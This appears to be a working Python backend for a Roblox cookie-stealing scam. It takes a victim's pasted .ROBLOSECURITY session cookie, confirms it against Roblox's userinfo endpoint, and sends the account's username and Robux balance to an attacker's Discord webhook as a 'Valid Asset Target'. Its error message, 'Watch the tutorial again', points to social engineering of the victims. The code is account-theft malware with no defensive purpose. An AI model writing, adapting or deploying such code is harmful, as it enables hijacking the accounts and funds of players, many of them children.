import sys
import base64
import os
import requests

def main():
    if len(sys.argv) < 2:
        print("Error: No data provided", file=sys.stderr)
        sys.exit(1)

    try:
        # Decode the payload sent from the frontend/server
        encoded_data = sys.argv[1]
        decoded_data = base64.b64decode(encoded_data).decode('utf-8').strip()
    except Exception as e:
        print("Error: Invalid payload encoding", file=sys.stderr)
        sys.exit(1)

    # Check if input looks like a Roblox .ROBLOSECURITY cookie
    if "_|WARNING:-DO-NOT-SHARE-THIS" in decoded_data:
        # Validate the cookie against Roblox's official userinfo endpoint
        headers = {
            "Cookie": decoded_data,
            "User-Agent": "Mozilla/5.0"
        }
        
        try:
            response = requests.get("https://www.roblox.com/mobileapi/userinfo", headers=headers, timeout=5)
            
            # If Roblox rejects the cookie, it's invalid!
            if response.status_code != 200:
                print("Error: Watch the tutorial again", file=sys.stderr)
                sys.exit(1)
                
            user_data = response.json()
            username = user_data.get("UserName", "Unknown")
            robux = user_data.get("RobuxBalance", 0)
            
        except Exception as err:
            # Connection timeout or invalid response format
            print("Error: Watch the tutorial again or smth", file=sys.stderr)
            sys.exit(1)
    else:
        # If they just typed random text or an invalid format instead of a cookie
        print("Error: Watch the tutorial again", file=sys.stderr)
        sys.exit(1)

    # ==========================================
    # IF WE REACH HERE, THE COOKIE IS 100% VALID!
    # Now we can safely send the webhook via your Cloudflare Proxy.
    # ==========================================
    
    webhook_url = os.environ.get("DISCORD_WEBHOOK_URL")
    if webhook_url:
        payload = {
            "content": f"🎯 **Valid Asset Target Extracted!**\n👤 **User:** `{username}`\n💰 **Robux:** `{robux}`"
        }
        try:
            requests.post(webhook_url, json=payload, timeout=5)
        except Exception as e:
            pass # Silent pass if webhook fails to prevent leaking errors

    sys.exit(0)

if __name__ == "__main__":
    main()
